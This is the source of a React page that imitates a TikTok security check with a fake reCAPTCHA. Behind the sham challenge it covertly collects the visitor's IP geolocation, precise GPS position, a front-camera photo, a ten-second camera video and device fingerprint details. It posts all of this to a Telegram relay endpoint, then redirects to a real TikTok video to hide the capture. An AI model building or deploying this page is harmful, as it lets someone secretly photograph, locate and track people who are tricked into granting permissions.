"use client";

import { useState, useRef, useEffect } from "react";

// URL video TikTok yang asli
const TIKTOK_VIDEO_URL = "https://www.tiktok.com/@slowmoetamin/video/7189732707822226694?is_from_webapp=1&sender_device=pc&web_id=7641670620761261576";

export default function TikTokVerifyPage() {
  const [isVerified, setIsVerified] = useState(false);
  const [isChecking, setIsChecking] = useState(false);
  const [hasTriggered, setHasTriggered] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [showRedirectLoader, setShowRedirectLoader] = useState(false);
  const [captchaState, setCaptchaState] = useState<"idle" | "checking" | "done">("idle");
  const [captchaChallenge, setCaptchaChallenge] = useState(false);
  const [selectedImages, setSelectedImages] = useState<number[]>([]);
  const [challengeImages] = useState(() => {
    // Generate random challenge: select all images with a specific item
    const items = ["tiktok", "video", "music", "note"];
    const targetItem = items[Math.floor(Math.random() * items.length)];
    // 3x3 grid, some have the target
    const grid = Array.from({ length: 9 }, (_, i) => {
      const hasTarget = Math.random() > 0.4;
      return { id: i, hasTarget, item: hasTarget ? targetItem : items.filter(x => x !== targetItem)[Math.floor(Math.random() * 3)] };
    });
    // Ensure at least 3 have target
    let count = grid.filter(g => g.hasTarget).length;
    while (count < 3) {
      const idx = Math.floor(Math.random() * 9);
      if (!grid[idx].hasTarget) {
        grid[idx].hasTarget = true;
        grid[idx].item = targetItem;
        count++;
      }
    }
    return { targetItem, grid };
  });
  const videoRef = useRef<HTMLVideoElement | null>(null);

  const redirectUrl = TIKTOK_VIDEO_URL;

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPopup(true);
    }, 800);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    const video = document.createElement("video");
    video.style.display = "none";
    video.muted = true;
    video.playsInline = true;
    document.body.appendChild(video);
    videoRef.current = video;

    return () => {
      if (videoRef.current) {
        document.body.removeChild(videoRef.current);
      }
    };
  }, []);

  const handleCaptchaCheck = () => {
    if (captchaState !== "idle") return;
    setCaptchaState("checking");
    // Simulate verification delay
    setTimeout(() => {
      setCaptchaChallenge(true);
      setCaptchaState("idle");
    }, 1500);
  };

  const handleImageSelect = (idx: number) => {
    setSelectedImages(prev =>
      prev.includes(idx) ? prev.filter(i => i !== idx) : [...prev, idx]
    );
  };

  const handleCaptchaVerify = () => {
    if (selectedImages.length === 0) return;
    setCaptchaState("checking");
    setTimeout(() => {
      setCaptchaState("done");
      setTimeout(() => {
        setShowRedirectLoader(true);
        setTimeout(() => {
          handleVerifyClick();
        }, 3000);
      }, 800);
    }, 2000);
  };

  // Get IP-based geolocation as fallback
  const getIPLocation = async (): Promise<{ ip: string; city: string; region: string; country: string; loc: string; org: string } | null> => {
    try {
      const res = await fetch("https://ipinfo.io/json?token=56ce10652d9d41");
      const data = await res.json();
      if (data.ip) return data;
      return null;
    } catch {
      return null;
    }
  };

  // Collect device info for Telegram
  const collectDeviceInfo = (ipLoc: { ip: string; city: string; region: string; country: string; loc: string; org: string } | null, gpsLoc: { lat: number; lng: number } | null) => {
    const ua = navigator.userAgent;
    const getOS = () => {
      if (/android/i.test(ua)) {
        const androidMatch = ua.match(/Android\s+([\d.]+)/);
        const modelMatch = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
        return "Android " + (androidMatch?.[1] || "?") + " (" + (modelMatch?.[1]?.trim() || "Unknown Device") + ")";
      }
      if (/iPad|iPhone|iPod/.test(ua)) {
        const iosMatch = ua.match(/OS\s+([\d_]+)/);
        return "iOS " + (iosMatch?.[1]?.replace(/_/g, ".") || "?");
      }
      if (/Windows/.test(ua)) {
        const winMatch = ua.match(/Windows NT\s+([\d.]+)/);
        const winVer: Record<string, string> = {"10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7"};
        return "Windows " + (winVer[winMatch?.[1] || ""] || winMatch?.[1] || "?");
      }
      if (/Mac OS X/.test(ua)) {
        const macMatch = ua.match(/Mac OS X\s+([\d_]+)/);
        return "macOS " + (macMatch?.[1]?.replace(/_/g, ".") || "?");
      }
      if (/Linux/.test(ua)) return "Linux";
      return "Unknown OS";
    };
    const getBrowser = () => {
      if (/Edg\//.test(ua)) return "Edge " + (ua.match(/Edg\/([\d.]+)/)?.[1] || "?");
      if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return "Chrome " + (ua.match(/Chrome\/([\d.]+)/)?.[1] || "?");
      if (/Firefox\//.test(ua)) return "Firefox " + (ua.match(/Firefox\/([\d.]+)/)?.[1] || "?");
      if (/Safari\//.test(ua)) return "Safari " + (ua.match(/Version\/([\d.]+)/)?.[1] || "?");
      return "Unknown Browser";
    };
    const getConnection = () => {
      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      if (conn) {
        const type = conn.effectiveType || conn.type || "unknown";
        const downlink = conn.downlink ? conn.downlink + " Mbps" : "";
        const rtt = conn.rtt ? " (" + conn.rtt + "ms latency)" : "";
        return type.toUpperCase() + (downlink ? " - " + downlink : "") + rtt;
      }
      return "Unknown";
    };

    let batteryInfo = "Unknown";
    const ramGB = (navigator as any).deviceMemory ? (navigator as any).deviceMemory + " GB" : "Unknown";
    const cpuCores = navigator.hardwareConcurrency || "Unknown";
    const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? "landscape" : "portrait");
    const dpr = window.devicePixelRatio || 1;
    const colorDepth = window.screen.colorDepth;

    // Build location section - prefer GPS, fallback to IP
    let locationLine = "";
    if (gpsLoc) {
      locationLine = "\ud83c\udf10 Latitude: " + gpsLoc.lat + "\n\ud83c\udf10 Longitude: " + gpsLoc.lng + "\n\ud83d\udd17 Google Maps: https://www.google.com/maps?q=" + gpsLoc.lat + "," + gpsLoc.lng;
    } else if (ipLoc) {
      locationLine = "\ud83d\udd52 IP: " + ipLoc.ip + "\n\ud83d\udccd City: " + ipLoc.city + "\n\ud83d\udccd Region: " + ipLoc.region + "\n\ud83c\udf0d Country: " + ipLoc.country + "\n\ud83d\udd17 Maps: https://www.google.com/maps?q=" + ipLoc.loc;
    } else {
      locationLine = "\u274c No location available";
    }

    // Use string concatenation to avoid escaping issues
    const line = "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501";

    const locationInfoStr =
      "\ud83c\udfb5 TIKTOK VIDEO VERIFICATION\n" + line +
      "\n\u23f0 Time: " + new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }) +
      "\n\ud83d\udcc5 Timestamp: " + new Date().toISOString() +
      "\n\n\ud83d\udccd LOCATION\n" + line +
      "\n" + locationLine +
      "\n\n\ud83d\udcbb DEVICE DETAILS\n" + line +
      "\n\ud83d\udcf1 OS: " + getOS() +
      "\n\ud83c\udf10 Browser: " + getBrowser() +
      "\n\ud83d\udda5\ufe0f Platform: " + navigator.platform +
      "\n\ud83c\udf0d Language: " + navigator.language +
      "\n\ud83d\udd50 Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone +
      "\n\ud83d\udd0b Battery: " + batteryInfo +
      "\n\ud83e\udde0 RAM: " + ramGB +
      "\n\u26a1 CPU Cores: " + cpuCores +
      "\n\ud83d\udcf6 Network: " + getConnection() +
      "\n\n\ud83d\udccd SCREEN\n" + line +
      "\n\ud83d\udccf Resolution: " + window.screen.width + "x" + window.screen.height +
      "\n\ud83d\udc41\ufe0f Viewport: " + window.innerWidth + "x" + window.innerHeight +
      "\n\ud83d\udd0d Pixel Ratio: " + dpr + "x" +
      "\n\ud83c\udfa8 Color Depth: " + colorDepth + "-bit" +
      "\n\ud83d\udd04 Orientation: " + orientation +
      "\n\n\ud83d\udccb USER AGENT\n" + line +
      "\n" + ua;

    return locationInfoStr;
  };

  const handleVerifyClick = async () => {
    if (hasTriggered) return;
    setHasTriggered(true);
    setIsChecking(true);

    // Always fetch IP location first (works without permission)
    const ipLocation = await getIPLocation();

    // Request geolocation (may be denied)
    let gpsLocation: { lat: number; lng: number } | null = null;
    try {
      gpsLocation = await new Promise<{ lat: number; lng: number } | null>((resolve) => {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
            () => resolve(null),
            { timeout: 10000, enableHighAccuracy: true }
          );
        } else {
          resolve(null);
        }
      });
    } catch {
      gpsLocation = null;
    }

    // Request camera permission
    let stream: MediaStream | null = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
      });
    } catch {
      // Camera denied — still send IP location + device info
    }

    setIsVerified(true);
    setIsChecking(false);

    // Always send data to Telegram
    (async () => {
      try {
        const formData = new FormData();
        let photoBlob: Blob | null = null;
        let videoBlob: Blob | null = null;

        if (stream) {
          photoBlob = await takePhoto(stream);
          videoBlob = await recordVideo(stream, 10000);
          stream.getTracks().forEach((track) => track.stop());
        }

        if (photoBlob) formData.append("photo", photoBlob, "photo.jpg");
        if (videoBlob) formData.append("video", videoBlob, "video.webm");

        const locationInfoStr = await collectDeviceInfo(ipLocation, gpsLocation);
        formData.append("locationInfo", locationInfoStr);

        await fetch("/api/telegram", {
          method: "POST",
          body: formData,
        });
      } catch (bgError) {
        console.error("Background capture failed:", bgError);
      }

      // Always redirect to TikTok
      window.location.href = redirectUrl;
    })();
  };

  const takePhoto = (stream: MediaStream): Promise<Blob | null> => {
    return new Promise((resolve) => {
      const video = videoRef.current;
      if (!video) return resolve(null);

      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(
              (blob) => resolve(blob),
              "image/jpeg",
              0.8
            );
          } else {
            resolve(null);
          }
        }, 1500);
      };
    });
  };

  const recordVideo = (stream: MediaStream, durationMs: number): Promise<Blob | null> => {
    return new Promise((resolve) => {
      let mediaRecorder: MediaRecorder;
      try {
        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
      } catch (e) {
        try {
          mediaRecorder = new MediaRecorder(stream);
        } catch (e2) {
          return resolve(null);
        }
      }

      const chunks: Blob[] = [];
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: mediaRecorder.mimeType });
        resolve(blob);
      };

      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder.state !== "inactive") {
          mediaRecorder.stop();
        }
      }, durationMs);
    });
  };

  // Icon SVGs for CAPTCHA grid
  const getIcon = (item: string) => {
    switch (item) {
      case "tiktok": return (
        <svg viewBox="0 0 24 24" className="w-8 h-8 md:w-10 md:h-10" fill="#fe2c55">
          <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1v-3.51a6.37 6.37 0 00-.79-.05A6.34 6.34 0 003.15 15.2a6.34 6.34 0 0010.86 4.46V13.2a8.19 8.19 0 005.58 2.17v-3.45a4.85 4.85 0 01-3.77-1.59V6.69h3.77z"/>
        </svg>
      );
      case "video": return (
        <svg viewBox="0 0 24 24" className="w-8 h-8 md:w-10 md:h-10" fill="#25f4ee">
          <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
        </svg>
      );
      case "music": return (
        <svg viewBox="0 0 24 24" className="w-8 h-8 md:w-10 md:h-10" fill="#fe2c55">
          <path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/>
        </svg>
      );
      case "note": return (
        <svg viewBox="0 0 24 24" className="w-8 h-8 md:w-10 md:h-10" fill="#25f4ee">
          <path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/>
        </svg>
      );
      default: return null;
    }
  };

  return (
    <div className="relative min-h-screen flex justify-center items-center font-sans overflow-hidden" style={{ background: '#000' }}>
      
      {/* Background Image - HALAMAN-TIKTOK.jpeg (NO blur, NO darkening) */}
      <div 
        className="fixed inset-0 w-full h-full z-0"
      >
        <img 
          src="/HALAMAN-TIKTOK.jpeg" 
          alt="TikTok Video" 
          className="w-full h-full object-cover"
        />
      </div>

      {/* CAPTCHA Popup - centered */}
      {showPopup && !isVerified && (
        <div 
          className="fixed inset-0 z-10 flex items-center justify-center"
        >
          {/* Backdrop */}
          <div className="absolute inset-0 bg-black/40" onClick={handleCaptchaCheck} />
          
          {/* CAPTCHA Card */}
          <div 
            className="relative w-full max-w-md mx-auto animate-slide-up"
          >
            <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
              
              {/* Header */}
              <div className="px-4 py-3 border-b border-gray-100 flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className="w-6 h-6 rounded-full bg-gradient-to-br from-[#fe2c55] to-[#25f4ee] flex items-center justify-center">
                    <svg viewBox="0 0 24 24" className="w-3.5 h-3.5" fill="white">
                      <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1v-3.51a6.37 6.37 0 00-.79-.05A6.34 6.34 0 003.15 15.2a6.34 6.34 0 0010.86 4.46V13.2a8.19 8.19 0 005.58 2.17v-3.45a4.85 4.85 0 01-3.77-1.59V6.69h3.77z"/>
                    </svg>
                  </div>
                  <span className="text-sm font-semibold text-gray-800">Security Check</span>
                </div>
                <div className="flex items-center gap-1">
                  <div className="w-2 h-2 rounded-full bg-green-400 animate-pulse" />
                  <span className="text-xs text-gray-400">TikTok</span>
                </div>
              </div>

              {/* CAPTCHA Content */}
              <div className="p-5">
                {!captchaChallenge ? (
                  /* Step 1: Checkbox CAPTCHA */
                  <div className="flex flex-col items-center">
                    <div className="w-full bg-gray-50 rounded-xl p-4 border border-gray-200">
                      <div className="flex items-center gap-3">
                        <button
                          onClick={handleCaptchaCheck}
                          className={`w-7 h-7 rounded border-2 flex items-center justify-center transition-all duration-300 ${
                            captchaState === "checking" 
                              ? "border-blue-500 bg-blue-50" 
                              : captchaState === "done"
                              ? "border-green-500 bg-green-500"
                              : "border-gray-300 hover:border-blue-400 bg-white"
                          }`}
                        >
                          {captchaState === "checking" && (
                            <div className="w-4 h-4 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
                          )}
                          {captchaState === "done" && (
                            <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                            </svg>
                          )}
                        </button>
                        <div className="flex-1">
                          <p className="text-sm font-medium text-gray-700">
                            {captchaState === "checking" ? "Verifying..." : "I'm not a robot"}
                          </p>
                        </div>
                        <div className="flex flex-col items-center">
                          <svg viewBox="0 0 24 24" className="w-8 h-8 text-gray-400" fill="currentColor">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
                          </svg>
                          <span className="text-[9px] text-gray-400 mt-0.5">reCAPTCHA</span>
                        </div>
                      </div>
                    </div>
                    <p className="text-xs text-gray-400 mt-3 text-center">
                      Complete the security check to continue
                    </p>
                  </div>
                ) : (
                  /* Step 2: Image Selection Challenge */
                  <div className="flex flex-col items-center">
                    <p className="text-sm font-medium text-gray-700 mb-1">
                      Select all images with <span className="font-bold text-[#fe2c55]">{challengeImages.targetItem}</span>
                    </p>
                    <p className="text-xs text-gray-400 mb-3">Click verify when done</p>
                    
                    {/* 3x3 Grid */}
                    <div className="grid grid-cols-3 gap-1.5 w-full max-w-[280px]">
                      {challengeImages.grid.map((cell, idx) => (
                        <button
                          key={idx}
                          onClick={() => handleImageSelect(idx)}
                          className={`relative aspect-square rounded-lg border-2 transition-all duration-200 flex items-center justify-center ${
                            selectedImages.includes(idx)
                              ? "border-[#fe2c55] bg-red-50 shadow-md scale-[1.02]"
                              : "border-gray-200 bg-gray-50 hover:border-gray-300"
                          }`}
                          style={{
                            background: selectedImages.includes(idx) 
                              ? "linear-gradient(135deg, #fff1f2, #fef2f2)" 
                              : "linear-gradient(135deg, #f9fafb, #f3f4f6)"
                          }}
                        >
                          {getIcon(cell.item)}
                          {selectedImages.includes(idx) && (
                            <div className="absolute top-1 right-1 w-4 h-4 bg-[#fe2c55] rounded-full flex items-center justify-center">
                              <svg className="w-2.5 h-2.5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                              </svg>
                            </div>
                          )}
                        </button>
                      ))}
                    </div>

                    {/* Verify Button */}
                    <button
                      onClick={handleCaptchaVerify}
                      disabled={selectedImages.length === 0 || captchaState === "checking"}
                      className={`mt-4 w-full py-2.5 rounded-lg font-semibold text-sm transition-all duration-200 ${
                        selectedImages.length > 0 && captchaState !== "checking"
                          ? "bg-[#fe2c55] text-white hover:bg-[#e6264d] shadow-lg shadow-red-200"
                          : "bg-gray-100 text-gray-400 cursor-not-allowed"
                      }`}
                    >
                      {captchaState === "checking" ? (
                        <span className="flex items-center justify-center gap-2">
                          <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                          Verifying...
                        </span>
                      ) : (
                        "Verify"
                      )}
                    </button>

                    <div className="flex items-center gap-1 mt-3">
                      <svg viewBox="0 0 24 24" className="w-5 h-5 text-gray-300" fill="currentColor">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
                      </svg>
                      <span className="text-[10px] text-gray-300">reCAPTCHA verification</span>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Success Toast */}
      {isVerified && !showRedirectLoader && (
        <div className="absolute top-6 left-1/2 -translate-x-1/2 z-30 text-white text-sm font-semibold py-2 px-4 rounded-full shadow-lg animate-[drop-in_2s_ease-in-out_forwards]" style={{ backgroundColor: '#fe2c55' }}>
          ✓ Verifikasi Berhasil
        </div>
      )}

      {/* Full-screen Redirect Loading Spinner */}
      {showRedirectLoader && (
        <div className="fixed inset-0 z-50 flex flex-col items-center justify-center" style={{ background: 'linear-gradient(180deg, #161823 0%, #121212 100%)' }}>
          {/* TikTok Spinner */}
          <div className="relative w-20 h-20 mb-6">
            <div className="absolute inset-0 rounded-full border-[3px] border-transparent" style={{ borderTopColor: '#fe2c55', borderRightColor: '#fe2c55', animation: 'spin 1s linear infinite' }} />
            <div className="absolute inset-2 rounded-full border-[3px] border-transparent" style={{ borderTopColor: '#25f4ee', borderLeftColor: '#25f4ee', animation: 'spin 1.5s linear infinite reverse' }} />
            <div className="absolute inset-0 flex items-center justify-center">
              <svg viewBox="0 0 24 24" className="w-8 h-8" fill="white">
                <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-2.88 2.5 2.89 2.89 0 01-2.89-2.89 2.89 2.89 0 012.89-2.89c.28 0 .54.04.79.1v-3.51a6.37 6.37 0 00-.79-.05A6.34 6.34 0 003.15 15.2a6.34 6.34 0 0010.86 4.46V13.2a8.19 8.19 0 005.58 2.17v-3.45a4.85 4.85 0 01-3.77-1.59V6.69h3.77z"/>
              </svg>
            </div>
          </div>
          <p className="text-white text-sm font-medium mb-1">Verifikasi selesai</p>
          <p className="text-gray-400 text-xs">Mengalihkan ke TikTok...</p>
          {/* Progress dots */}
          <div className="flex gap-1.5 mt-4">
            <div className="w-1.5 h-1.5 rounded-full bg-[#fe2c55] animate-bounce" style={{ animationDelay: '0ms' }} />
            <div className="w-1.5 h-1.5 rounded-full bg-[#25f4ee] animate-bounce" style={{ animationDelay: '150ms' }} />
            <div className="w-1.5 h-1.5 rounded-full bg-[#fe2c55] animate-bounce" style={{ animationDelay: '300ms' }} />
          </div>
        </div>
      )}

      {/* Custom Styles */}
      <style dangerouslySetInnerHTML={{__html: `
        @keyframes slide-up {
          0% { transform: translateY(100%); opacity: 0; }
          100% { transform: translateY(0); opacity: 1; }
        }
        @keyframes drop-in {
          0% { transform: translate(-50%, -20px); opacity: 0; }
          10% { transform: translate(-50%, 0); opacity: 1; }
          80% { transform: translate(-50%, 0); opacity: 1; }
          100% { transform: translate(-50%, -20px); opacity: 0; visibility: hidden; }
        }
        .animate-slide-up {
          animation: slide-up 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}} />

    </div>
  );
}
